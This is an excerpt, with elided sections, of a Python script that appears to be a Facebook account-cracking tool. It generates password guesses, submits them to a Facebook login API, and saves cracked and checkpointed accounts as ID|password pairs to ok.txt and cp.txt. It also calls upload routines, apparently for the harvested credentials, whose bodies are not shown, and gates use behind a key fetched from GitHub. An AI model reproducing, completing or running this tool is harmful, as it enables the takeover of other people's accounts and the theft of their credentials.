...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Codexload/FARDINX.txt.git"])
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰Code X")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/faridul12/testing/blob/main/testing.approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : TANJIMUL HISHAM....
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : CODE KING
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : codexload
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWARNING  : Don't Go To The Dark Web
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: FARDIN): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [FARDIN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[FARDIN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [FARDIN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
